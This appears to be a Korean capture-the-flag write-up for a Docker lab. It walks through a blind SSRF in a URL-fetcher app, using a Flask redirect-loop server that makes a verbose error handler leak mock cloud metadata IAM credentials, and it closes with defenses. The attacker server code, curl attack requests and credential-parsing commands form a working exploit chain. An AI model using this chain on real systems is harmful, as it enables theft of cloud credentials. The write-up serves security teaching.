# Cloud Takeover — Stage 1 Writeup
## SSRF + HTTP 리다이렉트 루프 → IAM 자격증명 탈취

---

## 목차

1. [환경 구성](#1-환경-구성)
2. [정찰 — 서비스 파악](#2-정찰--서비스-파악)
3. [SSRF 취약점 확인](#3-ssrf-취약점-확인)
4. [에러 핸들러 동작 파악](#4-에러-핸들러-동작-파악)
5. [리다이렉트 루프 공격 서버 구성](#5-리다이렉트-루프-공격-서버-구성)
6. [공격 실행 및 자격증명 탈취](#6-공격-실행-및-자격증명-탈취)
7. [Flag 획득](#7-flag-획득)
8. [취약점 원인 요약](#8-취약점-원인-요약)

---

## 1. 환경 구성

### Docker 실행

```bash
docker-compose up -d
```

### 서비스 확인

```bash
docker-compose ps
```

```
NAME                STATUS    PORTS
vulnerable-app      Up        0.0.0.0:8080->8080/tcp
mock-metadata       Up        (외부 노출 없음)
```

### 접근 가능한 서비스

| 서비스 | 주소 | 비고 |
|---|---|---|
| vulnerable-app | http://localhost:8080 | 참가자 접근 가능 |
| mock-metadata | 10.0.0.10:80 | 내부 전용, 직접 접근 불가 |

---

## 2. 정찰 — 서비스 파악

브라우저로 `http://localhost:8080` 접속 시 URL Fetcher 서비스 확인.

```
내부 리소스를 가져오는 서비스입니다.
URL을 입력하면 서버가 대신 요청을 수행합니다.

⚠ 보안 정책: 내부 IP 및 메타데이터 서버 접근은 차단됩니다.
```

**관찰 포인트**
- 서버가 대신 HTTP 요청을 수행 → SSRF 가능성
- 내부 IP 차단을 언급 → 우회 시도 필요
- `/fetch` 엔드포인트로 POST 요청

---

## 3. SSRF 취약점 확인

### 3-1. 내부 IP 직접 요청 시도

```bash
# 메타데이터 IP 직접 요청
curl -s -X POST http://localhost:8080/fetch \
  -d "url=http://169.254.169.254/"
```

```json
{"error": "접근이 차단된 URL입니다."}
```

```bash
# 내부 IP 직접 요청
curl -s -X POST http://localhost:8080/fetch \
  -d "url=http://10.0.0.10/"
```

```json
{"error": "접근이 차단된 URL입니다."}
```

→ 블랙리스트로 차단됨 확인.

### 3-2. 외부 서버 요청 시 응답 패턴 확인

```bash
# JSON 응답을 반환하는 외부 서버 요청
curl -s -X POST http://localhost:8080/fetch \
  -d "url=https://httpbin.org/get"
```

```json
{"status": "success", "result": {...}}
```

```bash
# JSON이 아닌 응답
curl -s -X POST http://localhost:8080/fetch \
  -d "url=https://example.com"
```

```json
{"status": "error", "error": "응답을 처리할 수 없습니다."}
```

**관찰 포인트**
- 정상 응답은 JSON일 때만 반환됨
- JSON이 아닌 경우 응답 내용이 노출되지 않음 (Blind SSRF)

---

## 4. 에러 핸들러 동작 파악

### 4-1. 에러 상황에서의 응답 차이 탐색

리다이렉트를 유발하는 서버로 요청을 보내 에러 응답 패턴을 확인한다.

```bash
# 리다이렉트를 무한 반복하는 서버로 요청
# (예: 직접 루프 서버 구성 또는 리다이렉트가 많은 URL 활용)
curl -s -X POST http://localhost:8080/fetch \
  -d "url=http://<테스트서버>/loop"
```

```json
{
  "status": "error",
  "error": "Too many redirects",
  "debug_info": [
    "HTTP/1.1 302 FOUND",
    "location: /loop",
    "HTTP/1.1 302 FOUND",
    ...
  ],
  "last_response": "..."
}
```

**핵심 발견**
- `Too many redirects` 에러 발생 시 `debug_info`와 `last_response`가 노출됨
- 리다이렉트 체인 전체가 응답에 포함됨
- **마지막 리다이렉트 목적지의 응답까지 `last_response`에 포함**

### 4-2. 동작 원리 이해

```
정상 요청  → JSON 파싱 성공 → result 반환
           → JSON 파싱 실패 → "처리할 수 없습니다" (Blind)

에러 요청  → Too many redirects → debug_info + last_response 노출 ← 취약점!
```

→ 전략: 리다이렉트를 MAX_REDIRECTS 이상 발생시키고,
         마지막 리다이렉트를 메타데이터 서버로 유도하면
         메타데이터 응답이 `last_response`에 포함되어 노출됨.

---

## 5. 리다이렉트 루프 공격 서버 구성

### 5-1. 공격 서버 로직 설계

```
목표: MAX_REDIRECTS(5회) 초과 유도 후 메타데이터로 리다이렉트

/start
  → 302 → /r?c=1
  → 303 → /r?c=2
  → 304 → /r?c=3
  → 305 → /r?c=4
  → 306 → /r?c=5   ← 5회 초과, 에러 핸들러 발동
  → 307 → /r?c=6
  (이후 카운터가 충분히 쌓이면)
  → 302 → http://10.0.0.10/latest/meta-data/iam/security-credentials/ctf-ec2-role
             ↓
           IAM 자격증명 JSON 응답 ← last_response에 포함되어 노출!
```

### 5-2. 공격 서버 코드 (attacker.py)

```python
from flask import Flask, redirect, request

app = Flask(__name__)

# 취약한 앱 내부 네트워크에서 접근 가능한 메타데이터 주소
TARGET = "http://10.0.0.10/latest/meta-data/iam/security-credentials/ctf-ec2-role"

@app.route('/start')
def start():
    return redirect("/r?c=0", code=302)

@app.route('/r')
def redir():
    c = int(request.args.get('c', 0)) + 1
    if c >= 6:
        return redirect(TARGET, code=302)
    return redirect(f"/r?c={c}", code=302 + c)

app.run(host='0.0.0.0', port=4000, debug=False)
```

### 5-3. 공격 서버 실행

공격 서버는 `vulnerable-app`이 접근 가능한 네트워크에서 실행해야 한다.
Docker 네트워크 내부에서 실행하는 방법:

```bash
# 공격 서버를 CTF 네트워크에 연결하여 실행
docker run --rm \
  --network ctf-cloud-takeover_ctf-net \
  --ip 10.0.0.100 \
  -v $(pwd)/attacker.py:/app/attacker.py \
  -w /app \
  python:3.11-slim \
  bash -c "pip install flask -q && python attacker.py"
```

또는 `docker-compose.yml`에 공격 서버 서비스를 추가:

```yaml
# docker-compose.yml에 추가
  attacker:
    image: python:3.11-slim
    command: bash -c "pip install flask -q && python /app/attacker.py"
    volumes:
      - ./attacker.py:/app/attacker.py
    networks:
      ctf-net:
        ipv4_address: 10.0.0.100
```

---

## 6. 공격 실행 및 자격증명 탈취

### 6-1. 공격 요청 전송

```bash
curl -s -X POST http://localhost:8080/fetch \
  -d "url=http://10.0.0.100:4000/start" | python3 -m json.tool
```

### 6-2. 응답 분석

```json
{
  "status": "error",
  "error": "Too many redirects",
  "debug_info": [
    "HTTP/1.1 302 FOUND",
    "location: /r?c=1",
    "",
    "HTTP/1.1 303 SEE OTHER",
    "location: /r?c=2",
    "",
    "HTTP/1.1 304 NOT MODIFIED",
    "location: /r?c=3",
    "",
    "HTTP/1.1 305 USE PROXY",
    "location: /r?c=4",
    "",
    "HTTP/1.1 306 RESERVED",
    "location: /r?c=5",
    "",
    "HTTP/1.1 302 FOUND",
    "location: http://10.0.0.10/latest/meta-data/iam/security-credentials/ctf-ec2-role",
    ""
  ],
  "last_response": "{\"Code\": \"Success\", \"Type\": \"AWS-HMAC\", \"AccessKeyId\": \"ASIACTFEC2ROLEKEY001\", \"SecretAccessKey\": \"ctfSecretKeyForEC2RoleDoNotLeak00\", \"Token\": \"ctf-session-token-ec2-role-00000\", \"Expiration\": \"2099-12-31T23:59:59Z\", \"LastUpdated\": \"2025-06-23T00:00:00Z\", \"Flag\": \"CTF{bl1nd_ssrf_r3d1r3ct_loop_m3t4d4t4_pwn3d}\"}"
}
```

### 6-3. 자격증명 파싱

```bash
curl -s -X POST http://localhost:8080/fetch \
  -d "url=http://10.0.0.100:4000/start" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
creds = json.loads(data['last_response'])
print('AccessKeyId    :', creds['AccessKeyId'])
print('SecretAccessKey:', creds['SecretAccessKey'])
print('Token          :', creds['Token'])
print('Flag           :', creds.get('Flag', 'N/A'))
"
```

```
AccessKeyId    : ASIACTFEC2ROLEKEY001
SecretAccessKey: ctfSecretKeyForEC2RoleDoNotLeak00
Token          : ctf-session-token-ec2-role-00000
Flag           : CTF{bl1nd_ssrf_r3d1r3ct_loop_m3t4d4t4_pwn3d}
```

---

## 7. Flag 획득

```
CTF{bl1nd_ssrf_r3d1r3ct_loop_m3t4d4t4_pwn3d}
```

메타데이터 응답의 `Flag` 필드에서 획득.

---

## 8. 취약점 원인 요약

### 취약점 1 — 블랙리스트가 최초 URL만 검사

```python
# app.py
if is_blocked(url):          # 최초 URL만 검사
    return "차단", 403

c.setopt(pycurl.FOLLOWLOCATION, True)   # 리다이렉트는 그대로 follow
```

→ 공격자 서버(`10.0.0.100`)는 블랙리스트를 통과하고,
  리다이렉트 이후 목적지(`10.0.0.10`)는 검사하지 않음.

### 취약점 2 — 에러 핸들러가 전체 체인 노출

```python
# app.py
except pycurl.error as e:
    if errno == pycurl.E_TOO_MANY_REDIRECTS:
        return jsonify({
            "debug_info":    header_buffer,    # 전체 헤더 체인 노출
            "last_response": response_buffer   # 최종 응답 본문 노출
        }), 500
```

→ MAX_REDIRECTS 초과 시 에러 핸들러가 메타데이터 응답을 그대로 반환.

### 방어 방법

| 방어 방법 | 설명 |
|---|---|
| 리다이렉트 목적지 검증 | 매 리다이렉트마다 목적지 IP를 블랙리스트와 대조 |
| 리다이렉트 비활성화 | `FOLLOWLOCATION = False` 설정 |
| 에러 핸들러 정보 제한 | 에러 발생 시 내부 상태 노출 금지 |
| IMDSv2 적용 | 토큰 기반 인증으로 단순 GET 차단 |